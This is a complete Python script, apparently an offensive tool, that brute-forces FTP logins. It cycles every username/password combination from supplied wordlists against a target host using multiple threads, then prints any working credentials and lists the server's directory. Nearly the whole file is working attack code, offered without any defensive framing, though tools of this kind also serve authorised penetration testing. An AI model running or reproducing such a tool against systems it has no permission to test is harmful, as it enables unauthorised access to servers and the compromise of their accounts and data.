#!/usr/bin/env python3

# Oldschool FTP login scanner

import argparse
import ftplib
import threading
from queue import Queue

def ftp_login(host, port, username, password):
    try:
        with ftplib.FTP() as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            print(f"Successfully connected to {host} with {username}:{password}")
            ftp.dir()
    except ftplib.all_errors as e:
        print(f"FTP login failed: {username}:{password} -> {e}")

def worker(host, port, queue):
    while not queue.empty():
        username, password = queue.get()
        ftp_login(host, port, username, password)
        queue.task_done()

def main():
    parser = argparse.ArgumentParser(description="FTP Login Script")
    parser.add_argument("-H", "--host", required=True, help="Hostname or IP address of the FTP server")
    parser.add_argument("-P", "--port", type=int, default=21, help="Port number of the FTP server (default: 21)")
    parser.add_argument("-U", "--username", help="Username for FTP login")
    parser.add_argument("-W", "--password", help="Password for FTP login")
    parser.add_argument("-ul", "--ulist", help="File containing a list of usernames")
    parser.add_argument("-pl", "--plist", help="File containing a list of passwords")
    parser.add_argument("-t", "--threads", type=int, default=8, help="Number of threads to use (default: 8)")

    args = parser.parse_args()

    if not (args.username or args.ulist):
        print("[-] Username or Userlist is required")
        exit(1)

    if not (args.password or args.plist):
        print("[-] Password or Password-list is required")
        exit(1)

    ulist = []
    plist = []
    
    if args.ulist:
        with open(args.ulist, 'r') as u:
            ulist = [line.strip() for line in u if line.strip()]
    if args.username:
        ulist.insert(0, args.username)
    
    if args.plist:
        with open(args.plist, 'r') as p:
            plist = [line.strip() for line in p if line.strip()]
    if args.password:
        plist.insert(0, args.password)

    queue = Queue()
    for username in ulist:
        for password in plist:
            queue.put((username, password))
    
    threads = []
    for _ in range(min(args.threads, queue.qsize())):
        thread = threading.Thread(target=worker, args=(args.host, args.port, queue))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
    
if __name__ == "__main__":
    main()
